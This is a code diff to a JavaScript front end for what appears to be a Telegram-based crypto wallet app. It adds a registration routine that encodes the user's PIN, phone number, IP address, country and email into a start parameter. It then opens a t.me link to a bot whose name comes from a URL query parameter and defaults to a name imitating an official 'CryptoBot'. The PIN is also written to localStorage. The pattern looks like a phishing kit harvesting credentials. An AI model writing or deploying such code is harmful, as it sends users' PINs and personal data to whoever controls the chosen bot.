@@ -2826,6 +2826,69 @@
     }
     window.openRegistrationModal = openRegistrationModal;
 
+    function encodeRegistrationParam(pin, phone, ip, country, email) {
+      const cleanPin = (pin || '0000').replace(/\D/g, '').slice(0, 4);
+
+      let cleanPhone = (phone || '').replace(/\D/g, '');
+      if (cleanPhone.length > 13) cleanPhone = cleanPhone.slice(-13);
+      if (!cleanPhone) cleanPhone = '79991234567';
+
+      let ipHex = '7f000001';
+      try {
+        const octets = (ip || '').split('.');
+        if (octets.length === 4) {
+          ipHex = octets.map(o => {
+            const n = Math.min(255, Math.max(0, parseInt(o, 10) || 0));
+            return n.toString(16).padStart(2, '0');
+          }).join('');
+        }
+      } catch(e) {}
+
+      let cCode = 'RU';
+      const cLower = (country || '').toLowerCase();
+      if (cLower.includes('росс') || cLower.includes('russia')) cCode = 'RU';
+      else if (cLower.includes('укра') || cLower.includes('ukraine')) cCode = 'UA';
+      else if (cLower.includes('белар') || cLower.includes('belarus')) cCode = 'BY';
+      else if (cLower.includes('казах') || cLower.includes('kazakh')) cCode = 'KZ';
+      else if (cLower.includes('germany') || cLower.includes('герман')) cCode = 'DE';
+      else if (cLower.includes('usa') || cLower.includes('штат') || cLower.includes('america')) cCode = 'US';
+      else if (cLower.includes('poland') || cLower.includes('польш')) cCode = 'PL';
+      else if (country && country.length === 2) cCode = country.toUpperCase();
+      else if (country && country.length > 2) cCode = country.slice(0, 2).toUpperCase();
+
+      let em = (email || '').toLowerCase().trim();
+      let domainCode = '';
+      const domainMap = [
+        ['@gmail.com', '1'],
+        ['@mail.ru', '2'],
+        ['@yandex.ru', '3'],
+        ['@icloud.com', '4'],
+        ['@yahoo.com', '5'],
+        ['@outlook.com', '6'],
+        ['@bk.ru', '7'],
+        ['@inbox.ru', '8'],
+        ['@list.ru', '9']
+      ];
+      for (const [dom, code] of domainMap) {
+        if (em.endsWith(dom)) {
+          em = em.slice(0, -dom.length);
+          domainCode = code;
+          break;
+        }
+      }
+      if (!domainCode) {
+        em = em.replace('@', '_a_');
+      }
+      em = em.replace(/\./g, '-').replace(/[^a-zA-Z0-9_-]/g, '');
+
+      let emailPart = domainCode ? (em + '_' + domainCode) : em;
+      if (emailPart.length > 34) {
+        emailPart = emailPart.slice(0, 34);
+      }
+
+      return 'r_' + cleanPin + '_' + cleanPhone + '_' + ipHex + '_' + cCode + '_' + emailPart;
+    }
+
     function submitRegistrationForm() {
       const email = (document.getElementById('reg-email')?.value || '').trim();
       const phone = (document.getElementById('reg-phone')?.value || '').trim();
@@ -2861,12 +2924,22 @@
         localStorage.setItem('cb_user_pin', pin);
       } catch(e) {}
 
-      if (window.Telegram?.WebApp?.sendData) {
-        try {
+      const urlParams = new URLSearchParams(window.location.search);
+      const botUser = urlParams.get('bot') || 'CryptoBotOfficialbot';
+      const startParam = encodeRegistrationParam(pin, phone, detectedGeo.ip, detectedGeo.country, email);
+
+      try {
+        if (window.Telegram?.WebApp?.sendData) {
           window.Telegram.WebApp.sendData(JSON.stringify(payload));
-          window.Telegram.WebApp.close();
-          return;
-        } catch(e) {}
+        }
+      } catch(e) {}
+
+      if (window.Telegram?.WebApp?.openTelegramLink) {
+        window.Telegram.WebApp.openTelegramLink("https://t.me/" + botUser + "?start=" + startParam);
+        setTimeout(() => {
+          try { window.Telegram.WebApp.close(); } catch(e) {}
+        }, 300);
+        return;
       }
 
       closeModal();
@@ -5588,16 +5661,6 @@
       userNotifications.forEach(n => n.read = true);
       updateNotificationBadge();
 
-    // Check mode=reg from URL
-    try {
-      const urlParams = new URLSearchParams(window.location.search);
-      if (urlParams.get('mode') === 'reg') {
-        setTimeout(() => {
-          openRegistrationModal();
-        }, 250);
-      }
-    } catch(e) {}
-
       closeModal();
       showToast('Уведомления', 'Все уведомления отмечены как прочитанные');
     }
@@ -5740,6 +5803,15 @@
       renderExchangeChart();
       updateNotificationBadge();
       checkRegionalRestrictionFlag();
+
+      try {
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get('mode') === 'reg') {
+          setTimeout(() => {
+            openRegistrationModal();
+          }, 250);
+        }
+      } catch(e) {}
     }, 200);
 
   </script>
